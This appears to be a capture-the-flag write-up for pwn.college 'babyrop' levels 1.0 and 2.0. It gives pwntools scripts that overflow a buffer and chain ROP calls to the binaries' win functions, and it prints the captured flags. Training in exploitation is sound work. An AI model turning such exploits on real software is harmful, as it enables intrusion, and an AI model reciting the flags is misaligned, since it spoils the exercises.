# babyrop level1.0

why must hurt yourself? do it the manly way: using **pwntools** and it's useful `ROP` class :D

here's the python code for it
```py
# import that bad boi
from pwn import *
# set the context to 64bit arch (because the binary is compiled within that arch)
context.clear(arch='amd64')
# load the challenge executable to ELF class provided by pwn
e = ELF('/challenge/babyrop_level1.0')
# create new process (you can do it with subprocess too but pwn provide more handy way to handle the interaction)
r = e.process()
# we wait till the program starts asking input
r.recvline_endswith(b'return address).')
# load executable to create ROP chain using ROP class provided by pwntools
ro = ROP(e)
# call em "win"
ro.call("win")
# create em sexy ass payload
payload = [
    b'A' * 88, # we fill the buffer up + anything before retaddr (in this case, the program already told us the amount we have to fill it up :D)
    ro.chain() # then we put the rop chain after it
]
payload = b"".join(payload)
# send it
r.sendline(payload)
# we finally got the flag yay
r.interactive()
```

the flag is
```
pwn.college{MNXpL_8RBKcXg2abbpKjFANsZ-Q.QXxQzMsMTN1QzW}
```
# babyrop level2.0
the same as level1.0 but because it's ROP from pwntools it will be easy af

here's the python code for it:
```py
# same stuffs prep like level1.0
from pwn import *
context.clear(arch='amd64')
e = ELF('/challenge/babyrop_level2.0')
r = e.process()
r.recvline_endswith(b'return address).')
# rop part woohoo!!!
ro = ROP(e)
# call em "win_stage_1" first
ro.call("win_stage_1")
# then we call "win_stage_2" after that
ro.call("win_stage_2")
# create em sexy ass payload
payload = [
    b'A' * 56, # we fill the buffer up + anything before retaddr (in this case, the program already told us the amount we have to fill it up :D)
    ro.chain() # then we put the rop chain after it
]
payload = b"".join(payload)
# send it
r.sendline(payload)
# we finally got the flag yay
r.interactive()
```

the flag is
```
pwn.college{MDe5JbV3oM9Xkv59dFwPpKeGeKi.QXzQzMsMTN1QzW}
```